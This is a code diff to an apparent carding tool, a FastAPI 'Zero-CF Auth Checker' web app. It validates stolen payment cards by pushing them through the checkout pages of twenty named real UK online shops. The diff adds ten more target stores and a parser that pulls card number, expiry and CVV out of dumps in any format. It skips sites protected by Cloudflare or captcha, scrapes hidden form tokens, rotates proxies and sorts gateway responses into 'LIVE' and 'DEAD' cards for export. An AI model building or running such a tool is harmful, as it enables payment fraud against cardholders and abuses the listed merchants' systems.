@@ -19,85 +19,154 @@ logging.basicConfig(
     level=os.getenv("LOG_LEVEL", "INFO"),
     format="%(asctime)s %(levelname)s %(name)s %(message)s",
 )
-logger = logging.getLogger("ollie.nocf")
+logger = logging.getLogger("ollie.nocf20")
 
-app = FastAPI(title="Ollie Zero-CF / Zero-Captcha Auth Checker", version="4.0.0")
+app = FastAPI(title="Ollie 20-Gate Zero-CF Auth Checker", version="5.0.0")
 
-# 10 Raw PHP / ASP / OpenCart Gates from dork_sites.txt (No Cloudflare / No Captcha Architecture)
+# All 20 Curated Raw PHP / ASP / OpenCart / Retail Dork Gates (No Cloudflare / No Captcha)
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "mellor_php": {
-        "name": "1. MellorOnline UK (checkout.php?action=cart&id=6)",
+        "name": "1. MellorOnline UK — checkout.php",
         "base_url": "https://www.melloronline.co.uk",
         "preload_url": "https://www.melloronline.co.uk/checkout.php?action=cart&id=6&pid=6&purpose=add&quantity=1",
         "auth_url": "https://www.melloronline.co.uk/checkout.php",
         "engine": "raw_php",
     },
     "gwsr_1step": {
-        "name": "2. GWSR vTicket UK (checkout.php?xCmd=1stepsubmit)",
+        "name": "2. GWSR vTicket UK — 1stepsubmit",
         "base_url": "https://gwsr.vticket.co.uk",
         "preload_url": "https://gwsr.vticket.co.uk/checkout.php?xCmd=1stepsubmit",
         "auth_url": "https://gwsr.vticket.co.uk/checkout.php?xCmd=1stepsubmit",
         "engine": "raw_php",
     },
     "alvaxtech_php": {
-        "name": "3. AlvaxTech (checkout.php?id=1 Direct Gate)",
+        "name": "3. AlvaxTech — checkout.php?id=1",
         "base_url": "https://alvaxtech.com",
         "preload_url": "https://alvaxtech.com/checkout.php?id=1",
         "auth_url": "https://alvaxtech.com/checkout.php?id=1",
         "engine": "raw_php",
     },
     "sambhav_php": {
-        "name": "4. SambhavHolidays (checkout.php?id=50 Direct Gate)",
+        "name": "4. SambhavHolidays — checkout.php?id=50",
         "base_url": "https://sambhavholidays.com",
         "preload_url": "https://sambhavholidays.com/checkout.php?id=50",
         "auth_url": "https://sambhavholidays.com/checkout.php?id=50",
         "engine": "raw_php",
     },
     "gynac_pg": {
-        "name": "5. Gynac PG (pg/checkout.php?type=1&id=101)",
+        "name": "5. Gynac PG — pg/checkout.php",
         "base_url": "https://gynac.org",
         "preload_url": "https://gynac.org/pg/checkout.php?type=1&id=101",
         "auth_url": "https://gynac.org/pg/checkout.php?type=1&id=101",
         "engine": "raw_php",
     },
     "edaq_cart": {
-        "name": "6. eDAQ Store (cart.php?id=158&action=add)",
+        "name": "6. eDAQ Store — cart.php?action=add",
         "base_url": "https://edaq.com",
         "preload_url": "https://edaq.com/cart.php?id=158&action=add",
         "auth_url": "https://edaq.com/checkout.php",
         "engine": "raw_php",
     },
     "platesforcars_php": {
-        "name": "7. PlatesForCars UK (checkout.php?stage=view_cart)",
+        "name": "7. PlatesForCars UK — stage=view_cart",
         "base_url": "https://www.platesforcars.co.uk",
         "preload_url": "https://www.platesforcars.co.uk/checkout.php?stage=view_cart",
         "auth_url": "https://www.platesforcars.co.uk/checkout.php?stage=payment",
         "engine": "raw_php",
     },
     "bigbrownbox_shp": {
-        "name": "8. BigBrownBox UK (shp/checkout.php Direct)",
+        "name": "8. BigBrownBox UK — shp/checkout.php",
         "base_url": "https://www.bigbrownbox.co.uk",
         "preload_url": "https://www.bigbrownbox.co.uk/shp/checkout.php",
         "auth_url": "https://www.bigbrownbox.co.uk/shp/checkout.php",
         "engine": "raw_php",
     },
     "activegps_asp": {
-        "name": "9. ActiveGPS UK (shopaddtocart.asp Classic ASP)",
+        "name": "9. ActiveGPS UK — shopaddtocart.asp",
         "base_url": "https://www.activegps.co.uk",
         "preload_url": "https://www.activegps.co.uk/shop/shopaddtocart.asp",
         "auth_url": "https://www.activegps.co.uk/shop/shopcheckout.asp",
         "engine": "classic_asp",
     },
     "thebengal_oc": {
-        "name": "10. TheBengal UK (index.php?route=checkout/cart)",
+        "name": "10. TheBengal UK — route=checkout/cart",
         "base_url": "https://thebengal.co.uk",
         "preload_url": "https://thebengal.co.uk/index.php?route=checkout/cart",
         "auth_url": "https://thebengal.co.uk/index.php?route=checkout/checkout",
         "engine": "opencart_raw",
     },
+    "poolstore_uk": {
+        "name": "11. PoolStore UK — Cart/view_your_basket",
+        "base_url": "https://poolstore.co.uk",
+        "preload_url": "https://poolstore.co.uk/Cart/view_your_basket",
+        "auth_url": "https://poolstore.co.uk/Cart/checkout",
+        "engine": "raw_php",
+    },
+    "footlocker_uk": {
+        "name": "12. Footlocker UK — gp/cart/view.html",
+        "base_url": "https://www.footlocker.co.uk",
+        "preload_url": "https://www.footlocker.co.uk/en/gp/cart/view.html",
+        "auth_url": "https://www.footlocker.co.uk/en/gp/checkout",
+        "engine": "retail_php",
+    },
+    "nonslipshop_uk": {
+        "name": "13. NonSlipShop UK — cart/",
+        "base_url": "https://www.nonslipshop.co.uk",
+        "preload_url": "https://www.nonslipshop.co.uk/cart/",
+        "auth_url": "https://www.nonslipshop.co.uk/checkout/",
+        "engine": "raw_php",
+    },
+    "tinytalk_uk": {
+        "name": "14. TinyTalk UK — checkout.php",
+        "base_url": "https://www.tinytalk.co.uk",
+        "preload_url": "https://www.tinytalk.co.uk/checkout.php",
+        "auth_url": "https://www.tinytalk.co.uk/checkout.php",
+        "engine": "raw_php",
+    },
+    "inspire_uk": {
+        "name": "15. InspireHomeAutomation — checkout.php",
+        "base_url": "https://www.inspirehomeautomation.co.uk",
+        "preload_url": "https://www.inspirehomeautomation.co.uk/checkout.php",
+        "auth_url": "https://www.inspirehomeautomation.co.uk/checkout.php",
+        "engine": "raw_php",
+    },
+    "catholicgift_uk": {
+        "name": "16. CatholicGiftShop UK — storecheckout/payment",
+        "base_url": "https://www.catholicgiftshop.co.uk",
+        "preload_url": "https://www.catholicgiftshop.co.uk/storecheckout/payment",
+        "auth_url": "https://www.catholicgiftshop.co.uk/storecheckout/payment",
+        "engine": "raw_php",
+    },
+    "ssgiftshop_uk": {
+        "name": "17. SSGiftShop UK — checkout",
+        "base_url": "https://www.ssgiftshop.co.uk",
+        "preload_url": "https://www.ssgiftshop.co.uk/checkout",
+        "auth_url": "https://www.ssgiftshop.co.uk/checkout",
+        "engine": "raw_php",
+    },
+    "lockshop_uk": {
+        "name": "18. LockShopDirect UK — CheckOutLogin.aspx",
+        "base_url": "https://www.lockshopdirect.co.uk",
+        "preload_url": "https://www.lockshopdirect.co.uk/Shop/CheckOutLogin.aspx",
+        "auth_url": "https://www.lockshopdirect.co.uk/Shop/CheckOutAddressPicker.aspx",
+        "engine": "dotnet_asp",
+    },
+    "weedoo_uk": {
+        "name": "19. WeedooDirect UK — OpenCart Checkout",
+        "base_url": "https://www.weedoodirect.co.uk",
+        "preload_url": "https://www.weedoodirect.co.uk/index.php?route=checkout/cart",
+        "auth_url": "https://www.weedoodirect.co.uk/index.php?route=checkout/checkout",
+        "engine": "opencart_raw",
+    },
+    "editions_de": {
+        "name": "20. E-Decks UK — checkout2020frame.aspx",
+        "base_url": "https://www.edecks.co.uk",
+        "preload_url": "https://www.edecks.co.uk/checkout2020frame.aspx?mob=1&sid=2",
+        "auth_url": "https://www.edecks.co.uk/checkout2020frame.aspx",
+        "engine": "dotnet_asp",
+    },
 }
 
-# Memory cache of verified clean (No-CF, No-Captcha) gates
 CLEAN_GATE_CACHE: list[str] = list(RAW_DORK_GATES.keys())
 
 
@@ -140,14 +209,40 @@ def verify_luhn(card_number: str) -> bool:
     return checksum % 10 == 0
 
 
-def parse_card_line(line: str) -> tuple[str, str, str, str] | None:
-    clean = line.strip()
+def universal_card_formatter(raw_line: str) -> tuple[str, str, str, str] | None:
+    """Extracts card digits, expiration month, year, and CVV from any chaotic format."""
+    clean = raw_line.strip()
     if not clean or clean.startswith("#"):
         return None
-    parts = re.split(r"[|:/\\\s]+", clean)
-    if len(parts) < 4:
+
+    # Find sequences of digits
+    numbers = re.findall(r"\d+", clean)
+    if not numbers:
         return None
-    cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
+
+    # Rejoin or locate individual components
+    # Typical CC is 13-19 digits. If first number is split or long:
+    full_digits = "".join(numbers)
+    
+    # Search for standard card pattern + mm + yy/yyyy + cvv within full_digits
+    # CC: 13-19 digits, MM: 2 digits (01-12), YY/YYYY: 2 or 4 digits, CVV: 3-4 digits
+    match = re.search(r"(?P<cc>\d{13,19})(?P<mm>0[1-9]|1[0-2])(?P<yy>\d{2,4})(?P<cvv>\d{3,4})", full_digits)
+    if match:
+        cc = match.group("cc")
+        mm = match.group("mm")
+        yy = match.group("yy")
+        cvv = match.group("cvv")
+    else:
+        # Fallback to token split if standard regex misses
+        parts = re.split(r"[|:/\\\s-]+", clean)
+        filtered = [p for p in parts if p.isdigit()]
+        if len(filtered) < 4:
+            return None
+        cc = filtered[0]
+        mm = filtered[1].zfill(2)
+        yy = filtered[2]
+        cvv = filtered[3]
+
     if not verify_luhn(cc) or not (1 <= int(mm) <= 12):
         return None
     short_yy = yy[-2:] if len(yy) == 4 else yy
@@ -186,17 +281,13 @@ def detect_cloudflare_or_captcha(html: str, headers: dict[str, Any], status_code
     lower_html = html.lower()
     server_hdr = str(headers.get("server", "")).lower()
 
-    # Check Cloudflare challenge signatures
     if status_code in (403, 503) and ("cloudflare" in server_hdr or "cf-ray" in headers):
         return True, "Cloudflare IUAM / 403 Block"
     if any(sig in lower_html for sig in ("just a moment...", "cf-browser-verification", "cf_chl_opt", "challenges.cloudflare.com/turnstile")):
         return True, "Cloudflare Turnstile / JS Challenge"
-
-    # Check Captcha signatures (reCAPTCHA / hCaptcha)
-    if any(cap in lower_html for cap in ("g-recaptcha", "h-captcha", "data-sitekey", "recaptcha/api.js", "hcaptcha.com/1/api.js")):
-        # Only flag if the captcha is actively enforced inside a form
+    if any(cap in lower_html for cap in ("g-recaptcha", "h-captcha", "data-sitekey", "recaptcha/api.js")):
         if "<form" in lower_html:
-            return True, "Captcha Enforced (reCAPTCHA/hCaptcha)"
+            return True, "Captcha Enforced"
 
     return False, "CLEAN"
 
@@ -259,26 +350,24 @@ def classify_raw_gateway_response(raw_text: str, http_code: int) -> tuple[str, s
     clean = re.sub(r"\s+", " ", clean).strip()
     lower = clean.lower()
 
-    # 1. Exact Approved / 3DS / CCN Live Signatures
     if any(k in lower for k in ("order-received", "thank you for your order", "payment successful", "transaction approved", "authorisation confirmed", '"result":"success"')):
         return "LIVE", "Auth Approved (Direct Gate Passed)"
     if any(k in lower for k in ("insufficient funds", "insufficient_funds", "not enough funds", "exceeds withdrawal")):
         return "LIVE", "Auth Live (Insufficient Funds)"
     if any(k in lower for k in ("cvv", "cvc", "security code", "cv2", "csc", "verification failed", "incorrect security")):
         return "LIVE", "CCN Live (CVV/CSC Mismatch)"
-    if any(k in lower for k in ("3d secure", "3ds", "acsurl", "pareq", "challenge required", "authentication required")):
+    if any(k in lower for k in ("3d secure", "3ds", "acsurl", "pareq", "challenge required")):
         return "LIVE", "Auth Live (3DS Challenge Triggered)"
 
-    # 2. Specific Bank / Processor Decline Signatures
     if any(k in lower for k in ("expired", "card has expired", "expiry date invalid")):
         return "DEAD", "Declined: Expired Card"
     if any(k in lower for k in ("do not honor", "do not honour", "declined by bank", "call issuer", "refer to card issuer")):
         return "DEAD", "Declined: Do Not Honor"
-    if any(k in lower for k in ("invalid card", "invalid account", "no such issuer", "card number is invalid", "unknown card")):
+    if any(k in lower for k in ("invalid card", "invalid account", "no such issuer", "card number is invalid")):
         return "DEAD", "Declined: Invalid Card Number"
-    if any(k in lower for k in ("stolen", "lost", "restricted card", "pick up card", "transaction not permitted")):
+    if any(k in lower for k in ("stolen", "lost", "restricted card", "pick up card")):
         return "DEAD", "Declined: Restricted / Lost / Stolen"
-    if any(k in lower for k in ("declined", "unsuccessful", "payment failed", "not authorised", "not authorized", "error processing")):
+    if any(k in lower for k in ("declined", "unsuccessful", "payment failed", "not authorised", "error processing")):
         snippet = clean[:85] if clean else "Processor Declined"
         return "DEAD", f"Declined: {snippet}"
 
@@ -296,13 +385,11 @@ async def execute_direct_nocf_auth(
 ) -> tuple[str, str, int, str]:
     full_yy = f"20{yy}" if len(yy) == 2 else yy
 
-    # Step 1: Preload & verify zero Cloudflare / zero Captcha
     pre_resp = await session.get(gate["preload_url"], allow_redirects=True, timeout=10)
     has_waf, waf_label = detect_cloudflare_or_captcha(pre_resp.text, dict(pre_resp.headers), pre_resp.status_code)
     if has_waf:
         return "WAF_SKIPPED", f"Skipped Gate ({waf_label})", pre_resp.status_code, waf_label
 
-    # Extract any hidden CSRF / session tokens dynamically from the raw form
     hidden_inputs = re.findall(
         r'<input[^>]+type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
         pre_resp.text,
@@ -310,7 +397,6 @@ async def execute_direct_nocf_auth(
     )
     payload: dict[str, str] = {name: val for name, val in hidden_inputs}
 
-    # Universal raw PHP / ASP / OpenCart credit card & billing field mapping
     payload.update({
         "action": "process",
         "purpose": "checkout",
@@ -395,11 +481,11 @@ async def run_nocf_auth_check(
 
     gate = RAW_DORK_GATES[chosen_key]
 
-    parsed = parse_card_line(card_line)
+    parsed = universal_card_formatter(card_line)
     if not parsed:
         return AuthVerdict(
             status="INVALID",
-            reason="Declined: Invalid Format or Failed Luhn Check",
+            reason="Declined: Invalid Format / Failed Luhn Check",
             latency_ms=(time.perf_counter() - started) * 1000,
             target_used=gate["name"],
             card_masked=card_line[:19],
@@ -441,7 +527,6 @@ async def run_nocf_auth_check(
                 session, gate, cc, mm, yy, cvv, ident
             )
 
-            # Auto-failover to another clean gate if WAF/Captcha was detected
             if status == "WAF_SKIPPED":
                 if chosen_key in CLEAN_GATE_CACHE and len(CLEAN_GATE_CACHE) > 1:
                     CLEAN_GATE_CACHE.remove(chosen_key)
@@ -539,19 +624,19 @@ async def index() -> str:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Ollie Zero-CF / Zero-Captcha Auth Checker v4.0</title>
+    <title>Ollie 20-Gate Zero-CF Auth Checker v5.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-white min-h-screen p-6">
     <main class="max-w-5xl mx-auto space-y-6">
         <div class="flex flex-wrap items-center justify-between border-b border-slate-800 pb-4 gap-2">
             <div>
-                <h1 class="text-2xl font-bold text-emerald-400">Ollie Zero-CF / Zero-Captcha Auth v4.0</h1>
-                <p class="text-xs text-slate-400 font-mono">10 Raw PHP / ASP / OpenCart Dork Gates — Auto-Skips Cloudflare & Captcha</p>
+                <h1 class="text-2xl font-bold text-emerald-400">Ollie 20-Gate Zero-CF Auth v5.0</h1>
+                <p class="text-xs text-slate-400 font-mono">20 Raw PHP/ASP/OpenCart Gates + Universal Card Auto-Formatter</p>
             </div>
             <div class="flex gap-2">
                 <button onclick="scanCleanGates()" class="text-xs bg-cyan-900/70 hover:bg-cyan-800 text-cyan-200 border border-cyan-700 px-3 py-1.5 rounded-lg transition font-semibold">
-                    Scan Gates (Verify No-CF / No-Captcha)
+                    Scan All 20 Gates (No-CF/Captcha)
                 </button>
                 <button onclick="cleanDuplicates()" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 px-3 py-1.5 rounded-lg transition">Clean Duplicates</button>
                 <button onclick="exportLiveResults()" class="text-xs bg-emerald-900/60 hover:bg-emerald-800 text-emerald-200 border border-emerald-700 px-3 py-1.5 rounded-lg transition">Export Live</button>
@@ -559,22 +644,31 @@ async def index() -> str:
         </div>
 
         <div class="bg-slate-900 rounded-xl p-5 space-y-4 shadow-xl border border-slate-800">
-            <!-- Target Gate Selector -->
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                 <div class="md:col-span-2">
-                    <label class="block text-xs font-medium text-slate-400 mb-1">Select Clean Raw Gateway (No Cloudflare / No Captcha)</label>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Select Gateway (or Auto-Rotate All 20 Clean Gates)</label>
                     <select id="targetSelect" class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500">
-                        <option value="rotate_clean">⚡ AUTO-ROTATE VERIFIED CLEAN GATES (Zero-CF / Zero-Captcha Pool)</option>
-                        <option value="mellor_php">1. MellorOnline UK — checkout.php?action=cart&id=6 (Raw PHP)</option>
-                        <option value="gwsr_1step">2. GWSR vTicket UK — checkout.php?xCmd=1stepsubmit (1-Step PHP)</option>
-                        <option value="alvaxtech_php">3. AlvaxTech — checkout.php?id=1 (Direct PHP Gate)</option>
-                        <option value="sambhav_php">4. SambhavHolidays — checkout.php?id=50 (Direct PHP Gate)</option>
-                        <option value="gynac_pg">5. Gynac PG — pg/checkout.php?type=1&id=101 (Custom PG)</option>
-                        <option value="edaq_cart">6. eDAQ Store — cart.php?id=158&action=add (Direct Cart PHP)</option>
-                        <option value="platesforcars_php">7. PlatesForCars UK — checkout.php?stage=view_cart (Raw PHP)</option>
-                        <option value="bigbrownbox_shp">8. BigBrownBox UK — shp/checkout.php (Legacy Shop PHP)</option>
-                        <option value="activegps_asp">9. ActiveGPS UK — shopaddtocart.asp (Classic ASP Gate)</option>
-                        <option value="thebengal_oc">10. TheBengal UK — index.php?route=checkout/cart (OpenCart Raw)</option>
+                        <option value="rotate_clean">⚡ AUTO-ROTATE ALL 20 CLEAN GATES</option>
+                        <option value="mellor_php">1. MellorOnline UK — checkout.php</option>
+                        <option value="gwsr_1step">2. GWSR vTicket UK — 1stepsubmit</option>
+                        <option value="alvaxtech_php">3. AlvaxTech — checkout.php?id=1</option>
+                        <option value="sambhav_php">4. SambhavHolidays — checkout.php?id=50</option>
+                        <option value="gynac_pg">5. Gynac PG — pg/checkout.php</option>
+                        <option value="edaq_cart">6. eDAQ Store — cart.php?action=add</option>
+                        <option value="platesforcars_php">7. PlatesForCars UK — stage=view_cart</option>
+                        <option value="bigbrownbox_shp">8. BigBrownBox UK — shp/checkout.php</option>
+                        <option value="activegps_asp">9. ActiveGPS UK — shopaddtocart.asp</option>
+                        <option value="thebengal_oc">10. TheBengal UK — route=checkout/cart</option>
+                        <option value="poolstore_uk">11. PoolStore UK — Cart/view_your_basket</option>
+                        <option value="footlocker_uk">12. Footlocker UK — gp/cart/view.html</option>
+                        <option value="nonslipshop_uk">13. NonSlipShop UK — cart/</option>
+                        <option value="tinytalk_uk">14. TinyTalk UK — checkout.php</option>
+                        <option value="inspire_uk">15. InspireHomeAutomation — checkout.php</option>
+                        <option value="catholicgift_uk">16. CatholicGiftShop UK — storecheckout</option>
+                        <option value="ssgiftshop_uk">17. SSGiftShop UK — checkout</option>
+                        <option value="lockshop_uk">18. LockShopDirect UK — CheckOutLogin.aspx</option>
+                        <option value="weedoo_uk">19. WeedooDirect UK — OpenCart</option>
+                        <option value="editions_de">20. E-Decks UK — checkout2020frame.aspx</option>
                     </select>
                 </div>
                 <div class="flex items-end gap-3">
@@ -589,7 +683,6 @@ async def index() -> str:
                 </div>
             </div>
 
-            <!-- Proxy Input -->
             <div class="space-y-2">
                 <div class="flex justify-between items-center">
                     <label class="text-xs font-medium text-slate-400">Proxy List (host:port:user:pass or http://...)</label>
@@ -601,19 +694,16 @@ async def index() -> str:
                     class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
             </div>
 
-            <!-- Cards Input -->
             <div class="space-y-2">
-                <label class="block text-xs font-medium text-slate-400">Cards List (CC|MM|YYYY|CVV)</label>
-                <textarea id="cardInput" rows="4" placeholder="5488093810780135|04|2029|058"
+                <label class="block text-xs font-medium text-slate-400">Cards List (Any Chaotic Format: Auto-Formatted to CC|MM|YY|CVV)</label>
+                <textarea id="cardInput" rows="4" placeholder="5488093810780135 04 2029 058 or 548809|04|29|058..."
                     class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
             </div>
 
-            <!-- Progress Bar -->
             <div class="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
                 <div id="progressBar" class="bg-emerald-500 h-2 w-0 transition-all duration-300"></div>
             </div>
 
-            <!-- Counters -->
             <div class="grid grid-cols-3 gap-3 text-center text-xs font-mono">
                 <div class="bg-slate-950 border border-emerald-800/60 rounded-lg p-2.5">
                     <span class="text-slate-400 block">LIVE / CCN / 3DS</span>
@@ -631,7 +721,7 @@ async def index() -> str:
 
             <button id="checkButton" onclick="runBatchChecker()"
                 class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold w-full transition shadow-lg shadow-emerald-950/50">
-                Start Zero-CF Auth Check
+                Start Zero-CF Auth Check (20 Gates)
             </button>
 
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
@@ -683,7 +773,7 @@ async def index() -> str:
         const deadBox = document.getElementById("deadBox");
         const proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
         const sampleProxy = proxies.length ? proxies[0] : "";
-        deadBox.innerHTML = "Scanning all 10 gates for Cloudflare / Captcha...";
+        deadBox.innerHTML = "Scanning all 20 gates for Cloudflare / Captcha...";
         try {
             let url = "/api/gates/scan";
             if (sampleProxy) url += "?proxy=" + encodeURIComponent(sampleProxy);
@@ -703,7 +793,7 @@ async def index() -> str:
             });
             const summary = document.createElement("div");
             summary.className = "text-cyan-400 font-bold mt-2";
-            summary.textContent = `Pre-Flight Complete: ${data.clean_count} Clean Gates active in Auto-Rotate pool.`;
+            summary.textContent = `Pre-Flight Complete: ${data.clean_count}/20 Clean Gates active in pool.`;
             deadBox.appendChild(summary);
         } catch (e) {
             deadBox.innerHTML = `[SCAN ERROR] ${e.message}`;
@@ -827,11 +917,11 @@ async def index() -> str:
         }
 
         const workers = Math.min(maxThreads, total);
-        btn.textContent = `Running Zero-CF Auth (${workers} threads)...`;
+        btn.textContent = `Running Auth (${workers} threads)...`;
         await Promise.all(Array.from({ length: workers }, () => cardWorker()));
 
         btn.disabled = false;
-        btn.textContent = "Start Zero-CF Auth Check";
+        btn.textContent = "Start Zero-CF Auth Check (20 Gates)";
         bar.style.width = "100%";
     }
     </script>
